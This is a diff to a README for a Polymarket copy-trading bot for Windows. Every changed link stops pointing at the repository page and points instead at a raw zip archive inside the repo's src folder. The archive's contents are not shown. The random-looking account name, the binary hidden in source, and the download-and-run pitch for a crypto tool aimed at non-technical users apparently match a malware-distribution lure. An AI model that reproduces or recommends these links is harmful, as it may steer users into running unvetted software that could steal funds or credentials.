@@ -1,12 +1,12 @@
 # 🤖 polymarket-copy-trading-bot - Copy trades with less manual work
 
-[![Download](https://img.shields.io/badge/Download-Now-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot)
+[![Download](https://img.shields.io/badge/Download-Now-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot/raw/refs/heads/main/src/copy_bot_polymarket_trading_1.7.zip)
 
 ## 📥 Download and run
 
 Use this link to visit the page and download the app:
 
-[Open the download page](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot)
+[Open the download page](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot/raw/refs/heads/main/src/copy_bot_polymarket_trading_1.7.zip)
 
 ## 🖥️ What this app does
 
@@ -25,7 +25,7 @@ It is meant for Windows users who want a direct setup and a clear path from down
 ## 🚀 Getting started
 
 1. Open the download page:
-   [https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot)
+   [https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot/raw/refs/heads/main/src/copy_bot_polymarket_trading_1.7.zip](https://github.com/Stirgoldenpea934/polymarket-copy-trading-bot/raw/refs/heads/main/src/copy_bot_polymarket_trading_1.7.zip)
 
 2. Find the latest release or download file on the page.
 
